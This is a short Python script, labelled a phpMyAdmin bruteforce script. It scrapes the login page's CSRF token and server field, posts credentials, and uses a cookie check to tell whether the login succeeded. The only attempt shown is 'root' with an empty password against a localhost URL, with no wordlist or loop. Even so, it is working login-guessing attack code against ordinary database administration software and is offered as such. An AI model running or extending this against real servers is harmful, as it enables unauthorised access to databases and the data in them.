#!/usr/bin/python3

""" Python 3 PhpMyAdmin bruteforce script """

from bs4 import BeautifulSoup
from requests import get, post

PHPMYADMIN_LOGIN_URL = "http://127.0.0.1/openserver/phpmyadmin/index.php"

def parse_csrf_token(bs_tree: BeautifulSoup) -> str:
    """ Find csrf token """
    return bs_tree.select_one("input[name='token']")["value"]

def parse_server(bs_tree: BeautifulSoup) -> str:
    """ Find server number """
    return bs_tree.select_one("input[name='server']")["value"]

def login(username: str, password: str, csrf_token: str, server_num: str) -> bool:
    """ Tries to sign in """
    
    request = post(PHPMYADMIN_LOGIN_URL, data={
        "pma_username": username,
        "pma_password": password,
        "server": server_num,
        "token": csrf_token,
        "target": "index.php",
    }, headers={
        'User-Agent': 'Mozilla/5.0',
        'Connection': 'keep-alive',
        
    })

    cookies = request.headers['Set-Cookie']

    if ("pmaAuth-1=deleted" in cookies):
        return False
    else:
        return True

SOUP = BeautifulSoup(get(PHPMYADMIN_LOGIN_URL).text, "html.parser")

SERVER = parse_server(SOUP)
CSRF = parse_csrf_token(SOUP)

print(login("root", "", CSRF, SERVER))
